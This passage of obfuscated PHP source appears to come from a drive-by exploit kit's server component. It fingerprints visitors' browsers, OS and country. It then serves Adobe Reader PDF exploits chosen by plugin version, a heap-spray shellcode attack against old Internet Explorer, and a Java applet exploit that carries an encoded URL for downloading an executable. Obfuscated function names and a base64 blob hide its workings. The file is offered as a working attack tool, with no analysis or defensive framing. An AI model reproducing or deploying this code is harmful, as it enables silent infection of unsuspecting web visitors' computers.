W5jdGlvbihnLGQsYyl7dmFyIGU9YS5pbml0KGcpLGYsYjtpZihlPDApe3JldHVybiBudWxsfWY9YS5wbHVnaW47aWYoZi5nZXRWZXJzaW9uRG9uZSE9MSl7Zi5nZXRWZXJzaW9uKGQsYyk7aWYoZi5nZXRWZXJzaW9uRG9uZT09PW51bGwpe2YuZ2V0VmVyc2lvbkRvbmU9MX19YS5jbGVhbnVwKCk7Yj0oZi52ZXJzaW9ufHxmLnZlcnNpb24wKTtyZXR1cm4gYj9iLnJlcGxhY2UoYS5zcGxpdE51bVJlZ3gsYS5nZXRWZXJzaW9uRGVsaW1pdGVyKTpifX0sY2xlYW51cDpmdW5jdGlvbigpe30sYWRkV2luRXZlbnQ6ZnVuY3Rpb24oZCxjKXt2YXIgZT10aGlzLGE9d2luZG93LGI7aWYoZS5pc0Z1bmMoYykpe2lmKGEuYWRkRXZlbnRMaXN0ZW5lcil7YS5hZGRFdmVudExpc3RlbmVyKGQsYyxmYWxzZSl9ZWxzZXtpZihhLmF0dGFjaEV2ZW50KXthLmF0dGFjaEV2ZW50KCJvbiIrZCxjKX1lbHNle2I9YVsib24iK2RdO2FbIm9uIitkXT1lLndpbkhhbmRsZXIoYyxiKX19fX0sd2luSGFuZGxlcjpmdW5jdGlvbihkLGMpe3JldHVybiBmdW5jdGlvbigpe2QoKTtpZih0eXBlb2YgYz09ImZ1bmN0aW9uIil7YygpfX19LFdMZnVuY3M6WzBdLHJ1bldMZnVuY3M6ZnVuY3Rpb24oYSl7YS53aW5Mb2FkZWQ9dHJ1ZTthLmNhbGxBcnJheShhLldMZnVuY3MpO2lmKGEub25Eb25lRW1wdHlEaXYpe2Eub25Eb25lRW1wdHlEaXYoKX19LHdpbkxvYWRlZDpmYWxzZSwkJG9uV2luZG93TG9hZGVkOmZ1bmN0aW9uKGEpe3JldHVybiBmdW5jdGlvbihiKXtpZihhLndpbkxvYWRlZCl7YS5jYWxsKGIpfWVsc2V7YS5mUHVzaChiLGEuV0xmdW5jcyl9fX0sZGl2Om51bGwsZGl2V2lkdGg6NTAscGx1Z2luU2l6ZToxLGVtcHR5RGl2OmZ1bmN0aW9uKCl7dmFyIGM9dGhpcyxhLGUsYixkPTA7aWYoYy5kaXYmJmMuZGl2LmNoaWxkTm9kZXMpe2ZvcihhPWMuZGl2LmNoaWxkTm9kZXMubGVuZ3RoLTE7YT49MDthLS0pe2I9Yy5kaXYuY2hpbGROb2Rlc1thXTtpZihiJiZiLmNoaWxkTm9kZXMpe2lmKGQ9PTApe2ZvcihlPWIuY2hpbGROb2Rlcy5sZW5ndGgtMTtlPj0wO2UtLSl7Yi5yZW1vdmVDaGlsZChiLmNoaWxkTm9kZXNbZV0pfWMuZGl2LnJlbW92ZUNoaWxkKGIpfWVsc2V7fX19fX0sb25Eb25lRW1wdHlEaXY6ZnVuY3Rpb24oKXt2YXIgYT10aGlzO2lmKCFhLndpbkxvYWRlZCl7cmV0dXJufWlmKGEuV0xmdW5jcyYmYS5XTGZ1bmNzLmxlbmd0aD4wJiZhLmlzRnVuYyhhLldMZnVuY3NbYS5XTGZ1bmNzLmxlbmd0aC0xXSkpe3JldHVybn1pZihhLmphdmEpe2lmKGEuamF2YS5PVEY9PTMpe3JldHVybn1pZihhLmphdmEuZnVuY3MmJmEuamF2YS5mdW5jcy5sZW5ndGg+MCYmYS5pc0Z1bmMoYS5qYXZhLmZ1bmNzW2EuamF2YS5mdW5jcy5sZW5ndGgtMV0pKXtyZXR1cm59fWEuZW1wdHlEaXYoKX0sZ2V0T2JqZWN0OmZ1bmN0aW9uKGMsYSl7dmFyIGcsZD10aGlzLGY9bnVsbCxiPWQuZ2V0Q29udGFpbmVyKGMpO3RyeXtpZihiJiZiLmZpcnN0Q2hpbGQpe2Y9Yi5maXJzdENoaWxkfWlmKGEmJmYpe2YuZm9jdXMoKX19Y2F0Y2goZyl7fXJldHVybiBmfSxnZXRDb250YWluZXI6ZnVuY3Rpb24oYSl7cmV0dXJuKGEmJmFbMF0/YVswXTpudWxsKX0saW5zdGFudGlhdGU6ZnVuY3Rpb24oaixjLGcsYSxrKXt2YXIgbSxuPWRvY3VtZW50LGk9dGhpcyxyLHE9bi5jcmVhdGVFbGVtZW50KCJzcGFuIiksbyxoLGY9IjwiO3ZhciBsPWZ1bmN0aW9uKHQscyl7dmFyIHY9dC5zdHlsZSxkLHU7aWYoIXYpe3JldHVybn12Lm91dGxpbmU9Im5vbmUiO3YuYm9yZGVyPSJub25lIjt2LnBhZGRpbmc9IjBweCI7di5tYXJnaW49IjBweCI7di52aXNpYmlsaXR5PSJ2aXNpYmxlIjtpZihpLmlzQXJyYXkocykpe2ZvcihkPTA7ZDxzLmxlbmd0aDtkPWQrMil7dHJ5e3Zbc1tkXV09c1tkKzFdfWNhdGNoKHUpe319cmV0dXJufX0sYj1mdW5jdGlvbigpe3ZhciB0LHU9InBkMzM5OTMzOTkiLHM9bnVsbCxkPShuLmdldEVsZW1lbnRzQnlUYWdOYW1lKCJib2R5IilbMF18fG4uYm9keSk7aWYoIWQpe3RyeXtuLndyaXRlKGYrJ2RpdiBpZD0iJyt1KyciPm8nK2YrIi9kaXY+Iik7cz1uLmdldEVsZW1lbnRCeUlkKHUpfWNhdGNoKHQpe319ZD0obi5nZXRFbGVtZW50c0J5VGFnTmFtZSgiYm9keSIpWzBdfHxuLmJvZHkpO2lmKGQpe2lmKGQuZmlyc3RDaGlsZCYmaS5pc0RlZmluZWQoZC5pbnNlcnRCZWZvcmUpKXtkLmluc2VydEJlZm9yZShpLmRpdixkLmZpcnN0Q2hpbGQpfWVsc2V7ZC5hcHBlbmRDaGlsZChpLmRpdil9aWYocyl7ZC5yZW1vdmVDaGlsZChzKX19ZWxzZXt9fTtpZighaS5pc0RlZmluZWQoYSkpe2E9IiJ9aWYoaS5pc1N0cmluZyhqKSYmKC9bXlxzXS8pLnRlc3Qoaikpe3I9ZitqKycgd2lkdGg9IicraS5wbHVnaW5TaXplKyciIGhlaWdodD0iJytpLnBsdWdpblNpemUrJyIgJztmb3Iobz0wO288Yy5sZW5ndGg7bz1vKzIpe2lmKC9bXlxzXS8udGVzdChjW28rMV0pKXtyKz1jW29dKyc9IicrY1tvKzFdKyciICd9fXIrPSI+Ijtmb3Iobz0wO288Zy5sZW5ndGg7bz1vKzIpe2lmKC9bXlxzXS8udGVzdChnW28rMV0pKXtyKz1mKydwYXJhbSBuYW1lPSInK2dbb10rJyIgdmFsdWU9IicrZ1tvKzFdKyciIC8+J319cis9YStmKyIvIitqKyI+In1lbHNle3I9YX1pZighaS5kaXYpe2kuZGl2PW4uY3JlYXRlRWxlbWVudCgiZGl2Iik7aD1uLmdldEVsZW1lbnRCeUlkKCJwbHVnaW5kZXRlY3QiKTtpZihoKXtpLmRpdj1ofWVsc2V7aS5kaXYuaWQ9InBsdWdpbmRldGVjdCI7YigpfWwoaS5kaXYsWyJ3aWR0aCIsaS5kaXZXaWR0aCsicHgiLCJoZWlnaHQiLChpLnBsdWdpblNpemUrMykrInB4IiwiZm9udFNpemUiLChpLnBsdWdpblNpemUrMykrInB4IiwibGluZUhlaWdodCIsKGkucGx1Z2luU2l6ZSszKSsicHgiLCJ2ZXJ0aWNhbEFsaWduIiwiYmFzZWxpbmUiLCJkaXNwbGF5IiwiYmxvY2siXSk7aWYoIWgpe2woaS5kaXYsWyJwb3NpdGlvbiIsImFic29sdXRlIiwicmlnaHQiLCIwcHgiLCJ0b3AiLCIwcHgiXSl9fWlmKGkuZGl2JiZpLmRpdi5wYXJlbnROb2RlKXtpLmRpdi5hcHBlbmRDaGlsZChxKTtsKHEsWyJmb250U2l6ZSIsKGkucGx1Z2luU2l6ZSszKSsicHgiLCJsaW5lSGVpZ2h0IiwoaS5wbHVnaW5TaXplKzMpKyJweCIsInZlcnRpY2FsQWxpZ24iLCJiYXNlbGluZSIsImRpc3BsYXkiLCJpbmxpbmUiXSk7dHJ5e2lmKHEmJnEucGFyZW50Tm9kZSl7cS5mb2N1cygpfX1jYXRjaChtKXt9dHJ5e3EuaW5uZXJIVE1MPXJ9Y2F0Y2gobSl7fWlmKHEuY2hpbGROb2Rlcy5sZW5ndGg9PTEmJiEoaS5pc0dlY2tvJiZpLmNvbXBhcmVOdW1zKGkudmVyR2Vja28sIjEsNSwwLDAiKTwwKSl7bChxLmZpcnN0Q2hpbGQsWyJkaXNwbGF5IiwiaW5saW5lIl0pfXJldHVybltxXX1yZXR1cm5bbnVsbF19LGFkb2JlcmVhZGVyOnttaW1lVHlwZToiYXBwbGljYXRpb24vcGRmIixuYXZQbHVnaW5PYmo6bnVsbCxwcm9nSUQ6WyJBY3JvUERGLlBERiIsIlBERi5QZGZDdHJsIl0sY2xhc3NJRDoiY2xzaWQ6Q0E4QTk3ODAtMjgwRC0xMUNGLUEyNEQtNDQ0NTUzNTQwMDAwIixJTlNUQUxMRUQ6e30scGx1Z2luSGFzTWltZVR5cGU6ZnVuY3Rpb24oZCxjLGYpe3ZhciBiPXRoaXMsZT1iLiQsYTtmb3IoYSBpbiBkKXtpZihkW2FdJiZkW2FdLnR5cGUmJmRbYV0udHlwZT09Yyl7cmV0dXJuIDF9fWlmKGUuZ2V0TWltZUVuYWJsZWRQbHVnaW4oYyxmKSl7cmV0dXJuIDF9cmV0dXJuIDB9LGdldFZlcnNpb246ZnVuY3Rpb24oaSl7dmFyIGY9dGhpcyxjPWYuJCxnLGQsaixsPXA9bnVsbCxoPW51bGwsaz1udWxsLGEsYjtpPShjLmlzU3RyaW5nKGkpJiZpLmxlbmd0aCk/aS5yZXBsYWNlKC9ccy8sIiIpLnRvTG93ZXJDYXNlKCk6Zi5taW1lVHlwZTtpZihjLmlzRGVmaW5lZChmLklOU1RBTExFRFtpXSkpe2YuaW5zdGFsbGVkPWYuSU5TVEFMTEVEW2ldO3JldHVybn1pZighYy5pc0lFKXthPSJBZG9iZS4qUERGLipQbHVnLT9pbnxBZG9iZS4qQWNyb2JhdC4qUGx1Zy0/aW58QWRvYmUuKlJlYWRlci4qUGx1Zy0/aW4iO2lmKGYuZ2V0VmVyc2lvbkRvbmUhPT0wKXtmLmdldFZlcnNpb25Eb25lPTA7cD1jLmdldE1pbWVFbmFibGVkUGx1Z2luKGYubWltZVR5cGUsYSk7aWYoIXAmJmMuaGFzTWltZVR5cGUoZi5taW1lVHlwZSkpe3A9Yy5maW5kTmF2UGx1Z2luKGEsMCl9aWYocCl7Zi5uYXZQbHVnaW5PYmo9cDtoPWMuZ2V0TnVtKHAuZGVzY3JpcHRpb24pfHxjLmdldE51bShwLm5hbWUpO2g9Yy5nZXRQbHVnaW5GaWxlVmVyc2lvbihwLGgpO2lmKCFoJiZjLk9TPT0xKXtpZihmLnBsdWdpbkhhc01pbWVUeXBlKHAsImFwcGxpY2F0aW9uL3ZuZC5hZG9iZS5wZGZ4bWwiLGEpKXtoPSI5In1lbHNle2lmKGYucGx1Z2luSGFzTWltZVR5cGUocCwiYXBwbGljYXRpb24vdm5kLmFkb2JlLngtbWFycyIsYSkpe2g9IjgifX19fX1lbHNle2g9Zi52ZXJzaW9ufWw9Yy5nZXRNaW1lRW5hYmxlZFBsdWdpbihpLGEpO2YuaW5zdGFsbGVkPWwmJmg/MToobD8wOihmLm5hdlBsdWdpbk9iaj8tMC4yOi0xKSl9ZWxzZXtwPWMuZ2V0QVhPKGYucHJvZ0lEWzBdKXx8Yy5nZXRBWE8oZi5wcm9nSURbMV0pO2I9Lz1ccyooW1xkXC5dKykvZzt0cnl7ZD0ocHx8Yy5nZXRPYmplY3QoYy5pbnN0YW50aWF0ZSgib2JqZWN0IixbImNsYXNzaWQiLGYuY2xhc3NJRF0sWyJzcmMiLCIiXSwiIixmKSkpLkdldFZlcnNpb25zKCk7Zm9yKGo9MDtqPDU7aisrKXtpZihiLnRlc3QoZCkmJighaHx8UmVnRXhwLiQxPmgpKXtoPVJlZ0V4cC4kMX19fWNhdGNoKGcpe31mLmluc3RhbGxlZD1oPzE6KHA/MDotMSl9aWYoIWYudmVyc2lvbil7Zi52ZXJzaW9uPWMuZm9ybWF0TnVtKGgpfWYuSU5TVEFMTEVEW2ldPWYuaW5zdGFsbGVkfX0seno6MH07UGx1Z2luRGV0ZWN0LmluaXRTY3JpcHQoKTtQbHVnaW5EZXRlY3QuZ2V0VmVyc2lvbignLicpO3ZhciBpbnAgPSBQbHVnaW5EZXRlY3QuZ2V0VmVyc2lvbignQWRvYmVSZWFkZXInKS5zcGxpdCgnLicpO3ZhciBzdj1wYXJzZUludChpbnBbMF0raW5wWzFdK2lucFsyXSk7") . "if (sv<800){addp('./" . Config::get("ExploitsDir") . "/pdf.php?f=" . $file . "');} else if ((sv>=800) && (sv<931)){addp('./" . Config::get("ExploitsDir") . "/pdf2.php?f=" . $file . "');}} catch (e) {};setTimeout(asgsaf, 4000);};";
    }
    else
    {
        $exploitsContent .= "function dsfgsdfh(){setTimeout(asgsaf, 4000);};";
    }

    if( in_array("5", $selectedExploits) && $Client["name"] == "msie" && version_compare($Client["version"], "7.0", "<=") && $Client["os"] != "Windows 7" ) 
    {
        $exploitsContent .= "function sfghhhh(){var sc = unescape('" . _obfuscated_0D0E2A39072632110A3D251539011114032210091A2932_(_obfuscated_0D0E072D0A2C1E25182F3C352F0C31040F1B1D343F3D11_($urltoexe . "5")) . "');m = new Array();var hl = 0x86000-(sc.length*2);var rv = unescape('%u0c0c%u0c0c');while(rv.length<hl/2){rv+=rv;}var tc = rv.substring(0,hl/2);delete rv;for(i=0; i<270; i++){m[i] = tc + tc + sc;}};function asgsaf(){sfghhhh();try {for(i=1;i<10;i++){mrq.setAttribute('SnaQTD',document.location);}mrq.setAttribute('SnaQTD',document.getElementsByName('style'));var ifr=document.getElementById('hello');hello.location.href='about:\\u0c0c\\u0c0c\\u0c0c\\u0c0cblank';}catch(e){};setTimeout(end_redirect, 3000);}";
    }
    else
    {
        $exploitsContent .= "function asgsaf(){setTimeout(end_redirect, 3000);};";
    }

    if( in_array("6", $selectedExploits) ) 
    {
        $exploitsContent_NOJS = "<applet id='sghrh4634' code='xmleditor.peers.class' title=\"asgahas\" archive='./" . Config::get("ExploitsDir") . "/javaobe.jar'><param name='dskvnds' value='" . _obfuscated_0D373B27270E3C1A1C041111263C120840362822092C22_($urltoexe . "6", "uqU8/A1O-e=FNdztfDPLnpG5h3IalV.2yw?ZRY60X:kirJMB79bxSQC_Wvsmg#jcT4HE%K&o", "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/.:_-?&=%#") . "'/></applet>";
    }

    if( 0 < strlen($exploitsContent) || 0 < strlen($exploitsContent_NOJS) ) 
    {
        echo "<body>" . $exploitsContent_NOJS . "</body><script>" . JS::cryptjs("function end_redirect(){ };document.write(\"<body><OBJECT id=Pdf1 height=0 width=0 classid=clsid:CA8A9780-280D-11CF-A24D-444553540000></OBJECT><style type='text/css'>.css {behavior: url(#default#userData);}</style><MARQUEE id='mrq' class='css'></MARQUEE><iframe src='about:blank' frameborder='0' width='1' height='1' id='hello' name='hello'></iframe></body>\");" . $exploitsContent . "ewvf();") . "</script>";
        mysql_close();
    }
    else
    {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

}


class Browser
{
    public static $browsers = array( "MSIE", "Firefox", "Opera", "Chrome", "Safari", "Mozilla", "Flock", "Amaya", "Aol", "Avant", "Camino", "Konqueror", "Lynx", "Mosaic", "Netscape", "Omniweb", "Seamonkey", "Other browser" );
    public static $OSList = array( "Windows XP" => "(Windows NT 5.1)|(Windows XP)", "Windows Vista" => "(Windows NT 6.0)", "Windows 7" => "(Windows NT 7.0)|(Windows NT 6.1)", "Windows 2003" => "(Windows NT 5.2)", "Windows 95" => "(Windows 95)|(Win95)|(Windows_95)", "Windows 98" => "(Windows 98)|(Win98)", "Windows 2000" => "(Windows NT 5.0)|(Windows 2000)", "Windows ME" => "Windows ME", "Windows NT" => "(Windows NT 4.0)|(WinNT4.0)|(WinNT)|(Windows NT)", "Linux" => "(Linux)|(X11)", "Mac OS" => "(Mac_PowerPC)|(Macintosh)", "Open BSD" => "OpenBSD", "BeOS" => "BeOS", "Other OS" => "(Other)" );

    public static function compareIP($ip, $mask)
    {
        $arr = explode(".", $ip);
        $arr2 = explode(".", $mask);
        $good = true;
        for( $i = 0; $i < count($arr); $i++ ) 
        {
            if( $arr2[$i] != "*" && $arr2[$i] != $arr[$i] ) 
            {
                $good = false;
                break;
            }

        }
        return $good;
    }

    public static function getBrowserAndOS($user_agent = null, $ipaddr = null)
    {
        if( $user_agent == null ) 
        {
            $user_agent = (isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "");
        }

        $user_agent = strtolower($user_agent);
        if( $ipaddr == null ) 
        {
            $ipaddr = (isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : "");
        }

        $browser = array( "version" => "0.0.0", "name" => "unknown", "useragent" => "", "os" => "", "countryCode" => "", "countryName" => "", "BrowserID" => 0, "OSID" => 0, "CountryID" => 0 );
        if( $user_agent != "" ) 
        {
            $browser["useragent"] = $user_agent;
            foreach( Browser::$browsers as $id => $_browser ) 
            {
                if( preg_match("" . "/(" . $_browser . ")[\\/ ]?([0-9.]*)/i", $user_agent, $match) ) 
                {
                    $browser["name"] = $match[1];
                    $version = $match[2];
                    if( $_browser == "Opera" && preg_match("/Version\\/([0-9.]*)/i", $user_agent, $match) ) 
                    {
                        $version = $match[1];
                    }

                    $browser["version"] = $version;
                    $browser["BrowserID"] = $id;
                    break;
                }

            }
            $i = 0;
            foreach( Browser::$OSList as $CurrOS => $Match ) 
            {
                if( preg_match("/" . $Match . "/", $_SERVER["HTTP_USER_AGENT"]) ) 
                {
                    $browser["os"] = $CurrOS;
                    $browser["OSID"] = $i;
                    break;
                }

                $i++;
            }
        }

        if( $ipaddr != "" ) 
        {
            $browser["ip"] = $ipaddr;
            $filehandle = fopen(Config::get("LibDir") . "/data.dat", "rb") or exit( "Can not open data.dat\n" );
            $filepos = ftell($filehandle);
            fseek($filehandle, 0 - 3, SEEK_END);
            for( $i = 0; $i < 20; $i++ ) 
            {
                fseek($filehandle, 0 - 4, SEEK_CUR);
            }
            fseek($filehandle, $filepos, SEEK_SET);
            $ipnum = ip2long($ipaddr);
            $country_id = 0;
            $offset = 0;
            for( $depth = 31; 0 <= $depth; $depth-- ) 
            {
                fseek($filehandle, 2 * 3 * $offset, SEEK_SET) == 0 or exit( "fseek failed" );
                $buf = fread($filehandle, 2 * 3);
                $x = array( 0, 0 );
                for( $i = 0; $i < 2; $i++ ) 
                {
                    for( $j = 0; $j < 3; $j++ ) 
                    {
                        $x[$i] += ord($buf[3 * $i + $j]) << $j * 8;
                    }
                }
                if( $ipnum & 1 << $depth ) 
                {
                    if( 16776960 <= $x[1] ) 
                    {
                        $country_id = $x[1];
                        break;
                    }

                    $offset = $x[1];
                }
                else
                {
                    if( 16776960 <= $x[0] ) 
                    {
                        $country_id = $x[0];
                        break;
                    }

                    $offset = $x[0];
                }

            }
            $country_id -= 16776960;
            $browser["CountryID"] = $country_id;
            fclose($filehandle);
        }

        return $browser;
    }

}

function findfile($fileID)
{
    $file = ".";
    if( $handle = opendir(Config::get("FilesDir") . "/dir" . $fileID) ) 
    {
        while( $file == "." || $file == ".." || strpos($file, ".php") !== false ) 
        {
            $file = readdir($handle);
        }
        return $file;
    }

    return null;
}

function findredirect($fileID)
{
    $file = ".";
    if( $handle = opendir(Config::get("FilesDir") . "/red" . $fileID) ) 
    {
        while( $file == "." || $file == ".." || strpos($file, ".php") !== false ) 
        {
            $file = readdir($handle);
        }
        return $file;
    }

    return null;
}

function _obfuscated_0D2A1B220E082729120F092B3C5C0301283E5B042A2A22_($redID)
{
    $path = Config::get("FilesDir") . "/red" . $redID . "/";
    $fileName = findredirect($redID);
    if( $fileName != 0 ) 
    {
        rename($path . $fileName, $path . ($fileName - 1));
    }

}

function _obfuscated_0D373B27270E3C1A1C041111263C120840362822092C22_($s, $s2, $s3)
{
    $r = "";
    for( $i = 0; $i < strlen($s); $i++ ) 
    {
        $l = strpos($s3, $s[$i]);
        if( $l !== false ) 
        {
            $r .= $s2[$l];
        }

    }
    return $r;
}

function _obfuscated_0D5C1F3F3D3B0235151B39264031322610133139020811_($filename)
{
    $i = 0;
    for( $j = 0; $filename[$i] != "?"; $i++ ) 
    {
        $j += ord($filename[$i]);
    }
    $j += 7;
    $j %= 256;
    return dechex($j);
}


